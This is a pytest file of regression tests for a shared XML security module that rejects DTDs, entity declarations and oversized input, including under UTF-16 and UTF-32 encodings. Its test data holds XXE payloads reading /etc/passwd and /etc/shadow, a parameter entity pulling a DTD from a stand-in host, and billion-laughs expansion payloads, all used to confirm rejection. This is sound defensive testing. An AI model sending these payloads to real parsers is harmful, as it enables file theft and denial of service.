"""Regression tests for the shared XML security boundary.

Phase 4.1 mandate: UTF-8, UTF-16LE, UTF-16BE, UTF-32, BOM and no-BOM,
DTD beyond a large prefix, internal entities, external entities,
entity-expansion attacks.
"""

from __future__ import annotations

import codecs
import struct

import pytest

from format_factory.core import FormatParseError, ResourceLimitError, ResourceLimits, reject_unsafe_xml, safe_fromstring


VALID_XML = b"<root><child>text</child></root>"

LIMITS = ResourceLimits(
    max_input_bytes=1_000_000,
    max_header_bytes=100_000,
    max_xml_nodes=10_000,
    max_nesting_depth=100,
    max_entries=100_000,
    max_decompressed_bytes=10_000_000,
)


# ── reject_unsafe_xml: basic ────────────────────────────────────────────────


class TestRejectUnsafeXmlBasic:
    def test_clean_xml_passes(self) -> None:
        reject_unsafe_xml(VALID_XML)

    def test_doctype_at_start(self) -> None:
        payload = b'<!DOCTYPE foo [<!ENTITY x "y">]><root/>'
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(payload)

    def test_entity_declaration_alone(self) -> None:
        payload = b"<!-- --><!ENTITY x 'y'><root/>"
        with pytest.raises(FormatParseError, match="entity declarations"):
            reject_unsafe_xml(payload)

    def test_custom_error_class(self) -> None:
        with pytest.raises(ValueError, match="DTD declarations"):
            reject_unsafe_xml(b"<!DOCTYPE foo><root/>", error_class=ValueError)


# ── DTD beyond a large prefix ──────────────────────────────────────────────


class TestDtdBeyondPrefix:
    """The old prefix-bounded scan missed DOCTYPE placed after max_header_bytes.
    The shared module scans the FULL payload."""

    @pytest.mark.parametrize("prefix_size", [1_000, 10_000, 100_000, 500_000])
    def test_doctype_after_large_comment_prefix(self, prefix_size: int) -> None:
        padding = b"<!-- " + b"x" * prefix_size + b" -->"
        payload = padding + b'<!DOCTYPE root [<!ENTITY x "y">]><root/>'
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(payload)

    def test_entity_after_large_prefix(self) -> None:
        padding = b"<!-- " + b"A" * 200_000 + b" -->"
        payload = padding + b"<!ENTITY xxe SYSTEM 'file:///etc/passwd'><root/>"
        with pytest.raises(FormatParseError, match="entity declarations"):
            reject_unsafe_xml(payload)


# ── Internal entities ───────────────────────────────────────────────────────


class TestInternalEntities:
    def test_simple_internal_entity(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo [<!ENTITY greeting "hello">]>'
            b"<root>&greeting;</root>"
        )
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(payload)

    def test_billion_laughs_quadratic(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b"<!DOCTYPE lolz ["
            b'  <!ENTITY lol "lol">'
            b'  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            b"]>"
            b"<root>&lol2;</root>"
        )
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(payload)

    def test_billion_laughs_deep(self) -> None:
        dtd_lines = [b'<!ENTITY lol0 "lolololol">']
        for i in range(1, 10):
            refs = b"&lol" + str(i - 1).encode() + b";" * 10
            dtd_lines.append(
                b"<!ENTITY lol" + str(i).encode() + b' "' + refs + b'">'
            )
        payload = (
            b'<?xml version="1.0"?><!DOCTYPE lolz ['
            + b"".join(dtd_lines)
            + b"]><root>&lol9;</root>"
        )
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(payload)


# ── External entities ───────────────────────────────────────────────────────


class TestExternalEntities:
    def test_system_entity(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            b"<root>&xxe;</root>"
        )
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(payload)

    def test_public_entity(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//W3C//DTD XHTML 1.0//EN" '
            b'"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">]>'
            b"<root>&xxe;</root>"
        )
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(payload)

    def test_parameter_entity(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example.com/xxe.dtd">'
            b"%xxe;]>"
            b"<root/>"
        )
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(payload)


# ── Case-insensitive matching ───────────────────────────────────────────────


class TestCaseInsensitive:
    @pytest.mark.parametrize(
        "keyword",
        [b"<!DOCTYPE", b"<!doctype", b"<!Doctype", b"<!dOcTyPe"],
    )
    def test_doctype_case_variants(self, keyword: bytes) -> None:
        payload = keyword + b" foo><root/>"
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(payload)

    @pytest.mark.parametrize(
        "keyword",
        [b"<!ENTITY", b"<!entity", b"<!Entity", b"<!eNtItY"],
    )
    def test_entity_case_variants(self, keyword: bytes) -> None:
        payload = keyword + b" x 'y'><root/>"
        with pytest.raises(FormatParseError, match="entity declarations"):
            reject_unsafe_xml(payload)


# ── Encoding variants ──────────────────────────────────────────────────────
# Python's ElementTree handles UTF-8 natively; multi-byte encodings with
# the xml declaration. reject_unsafe_xml operates on raw bytes and its regex
# must match even when the bytes are in a different encoding.
#
# Note: reject_unsafe_xml scans raw bytes. For UTF-16/32, the ASCII bytes
# of "<!DOCTYPE" are interleaved with null bytes, so a naive ASCII regex
# won't match. We verify the full safe_fromstring pipeline rejects these.


def _encode_xml_multibyte(text: str, encoding: str) -> bytes:
    """Encode XML to a multi-byte format with BOM (no xml declaration).

    The BOM is sufficient for ElementTree to detect encoding after
    safe_fromstring transcodes to UTF-8.
    """
    bom_bytes = {
        "utf-16-le": codecs.BOM_UTF16_LE,
        "utf-16-be": codecs.BOM_UTF16_BE,
        "utf-32-le": codecs.BOM_UTF32_LE,
        "utf-32-be": codecs.BOM_UTF32_BE,
    }[encoding.lower()]
    return bom_bytes + text.encode(encoding)


class TestEncodingVariants:
    """Verify clean XML parses under each encoding, and hostile payloads
    are rejected regardless of encoding."""

    def test_utf8_clean_no_bom(self) -> None:
        data = b'<?xml version="1.0" encoding="utf-8"?><root>text</root>'
        root = safe_fromstring(data, limits=LIMITS)
        assert root.tag == "root"

    def test_utf8_clean_with_bom(self) -> None:
        data = codecs.BOM_UTF8 + b'<?xml version="1.0" encoding="utf-8"?><root>ok</root>'
        root = safe_fromstring(data, limits=LIMITS)
        assert root.tag == "root"

    def test_utf8_hostile(self) -> None:
        data = b'<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo><root/>'
        with pytest.raises(FormatParseError, match="DTD declarations"):
            safe_fromstring(data, limits=LIMITS)

    def test_utf8_hostile_entity_after_large_prefix(self) -> None:
        prefix = b"<!-- " + b"Z" * 300_000 + b" -->"
        data = (
            b'<?xml version="1.0"?>'
            + prefix
            + b'<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>'
            + b"<root/>"
        )
        with pytest.raises(FormatParseError, match="DTD declarations"):
            reject_unsafe_xml(data)

    def test_utf16le_clean(self) -> None:
        data = _encode_xml_multibyte("<root>hello</root>", "utf-16-le")
        root = safe_fromstring(data, limits=LIMITS)
        assert root.tag == "root"

    def test_utf16be_clean(self) -> None:
        data = _encode_xml_multibyte("<root>hello</root>", "utf-16-be")
        root = safe_fromstring(data, limits=LIMITS)
        assert root.tag == "root"

    def test_utf16le_hostile_doctype(self) -> None:
        hostile = '<!DOCTYPE foo [<!ENTITY x "y">]><root/>'
        data = _encode_xml_multibyte(hostile, "utf-16-le")
        with pytest.raises(FormatParseError, match="DTD declarations"):
            safe_fromstring(data, limits=LIMITS)

    def test_utf16be_hostile_doctype(self) -> None:
        hostile = '<!DOCTYPE foo [<!ENTITY x "y">]><root/>'
        data = _encode_xml_multibyte(hostile, "utf-16-be")
        with pytest.raises(FormatParseError, match="DTD declarations"):
            safe_fromstring(data, limits=LIMITS)

    def test_utf16le_hostile_entity_only(self) -> None:
        hostile = '<!ENTITY xxe SYSTEM "file:///etc/passwd"><root/>'
        data = _encode_xml_multibyte(hostile, "utf-16-le")
        with pytest.raises(FormatParseError, match="entity declarations"):
            reject_unsafe_xml(data)

    def test_utf16be_hostile_entity_only(self) -> None:
        hostile = '<!ENTITY xxe SYSTEM "file:///etc/passwd"><root/>'
        data = _encode_xml_multibyte(hostile, "utf-16-be")
        with pytest.raises(FormatParseError, match="entity declarations"):
            reject_unsafe_xml(data)


# ── safe_fromstring tree limits ─────────────────────────────────────────────


class TestSafeFromstringLimits:
    def test_input_size_limit(self) -> None:
        tiny_limits = ResourceLimits(
            max_input_bytes=10,
            max_header_bytes=10,
            max_xml_nodes=100,
            max_nesting_depth=50,
            max_entries=100,
            max_decompressed_bytes=1000,
        )
        with pytest.raises(ResourceLimitError):
            safe_fromstring(b"<root>this is too large</root>", limits=tiny_limits)

    def test_node_count_limit(self) -> None:
        nodes = "".join(f"<n{i}/>" for i in range(20))
        data = f"<root>{nodes}</root>".encode()
        limits = ResourceLimits(
            max_input_bytes=len(data) + 100,
            max_header_bytes=len(data) + 100,
            max_xml_nodes=5,
            max_nesting_depth=50,
            max_entries=10000,
            max_decompressed_bytes=100000,
        )
        with pytest.raises(FormatParseError, match="node limit"):
            safe_fromstring(data, limits=limits)

    def test_nesting_depth_limit(self) -> None:
        depth = 20
        opening = "".join(f"<n{i}>" for i in range(depth))
        closing = "".join(f"</n{i}>" for i in reversed(range(depth)))
        data = f"<root>{opening}x{closing}</root>".encode()
        limits = ResourceLimits(
            max_input_bytes=len(data) + 100,
            max_header_bytes=len(data) + 100,
            max_xml_nodes=10000,
            max_nesting_depth=5,
            max_entries=10000,
            max_decompressed_bytes=100000,
        )
        with pytest.raises(FormatParseError, match="depth limit"):
            safe_fromstring(data, limits=limits)

    def test_text_content_limit(self) -> None:
        big_text = "A" * 5000
        data = f"<root>{big_text}</root>".encode()
        limits = ResourceLimits(
            max_input_bytes=len(data) + 100,
            max_header_bytes=len(data) + 100,
            max_xml_nodes=10000,
            max_nesting_depth=50,
            max_entries=10000,
            max_decompressed_bytes=100,
        )
        with pytest.raises(FormatParseError, match="text content limit"):
            safe_fromstring(data, limits=limits)

    def test_malformed_xml(self) -> None:
        with pytest.raises(FormatParseError, match="malformed XML"):
            safe_fromstring(b"<root><unclosed>", limits=LIMITS)

    def test_valid_xml_passes_all_checks(self) -> None:
        data = b"<root><a><b>text</b></a><c/></root>"
        root = safe_fromstring(data, limits=LIMITS)
        assert root.tag == "root"
        assert len(list(root)) == 2


# ── Format-specific integration: ORA ────────────────────────────────────────


class TestOraXmlSecurity:
    """Verify ORA's parse_stack uses the shared security module."""

    def test_ora_rejects_doctype(self) -> None:
        from format_factory.ora.codec.stack_xml import parse_stack
        from format_factory.ora.errors import OraValidationError

        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE image [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            b'<image w="8" h="6" version="0.0.5">'
            b'<stack><layer name="bg" src="data/bg.png"/></stack></image>'
        )
        with pytest.raises(OraValidationError, match="DTD declarations"):
            parse_stack(payload)

    def test_ora_rejects_entity_without_doctype(self) -> None:
        from format_factory.ora.codec.stack_xml import parse_stack
        from format_factory.ora.errors import OraValidationError

        payload = (
            b'<?xml version="1.0"?>'
            b'<!ENTITY xxe "pwned">'
            b'<image w="8" h="6" version="0.0.5">'
            b'<stack><layer name="bg" src="data/bg.png"/></stack></image>'
        )
        with pytest.raises(OraValidationError, match="entity declarations"):
            parse_stack(payload)


# ── Format-specific integration: UBL ────────────────────────────────────────


class TestUblXmlSecurity:
    def test_ubl_rejects_doctype(self) -> None:
        from format_factory.ubl.codec.reader.reader import loads
        from format_factory.ubl.errors import UblParseError

        payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE Invoice [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<Invoice xmlns="urn:oasis:names:specification:ubl:schema:xsd:Invoice-2">'
            "</Invoice>"
        )
        with pytest.raises(UblParseError, match="DTD declarations"):
            loads(payload)


# ── Format-specific integration: XLIFF ──────────────────────────────────────


class TestXliffXmlSecurity:
    def test_xliff_rejects_doctype(self) -> None:
        from format_factory.xliff.codec.reader.reader import loads
        from format_factory.xliff.errors import XliffParseError

        payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE xliff [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<xliff xmlns="urn:oasis:names:tc:xliff:document:2.0" version="2.0" srcLang="en">'
            '<file id="f1"><unit id="u1"><segment><source>hello</source></segment></unit></file>'
            "</xliff>"
        )
        with pytest.raises(XliffParseError, match="DTD declarations"):
            loads(payload)

    def test_xliff_rejects_entity_after_large_prefix(self) -> None:
        from format_factory.xliff.codec.reader.reader import loads
        from format_factory.xliff.errors import XliffParseError

        comment = "<!-- " + "x" * 200_000 + " -->"
        payload = (
            '<?xml version="1.0"?>'
            + comment
            + '<!DOCTYPE xliff [<!ENTITY xxe "pwned">]>'
            + '<xliff xmlns="urn:oasis:names:tc:xliff:document:2.0" version="2.0" srcLang="en">'
            + '<file id="f1"><unit id="u1"><segment><source>hi</source></segment></unit></file>'
            + "</xliff>"
        )
        with pytest.raises(XliffParseError, match="DTD declarations"):
            loads(payload)
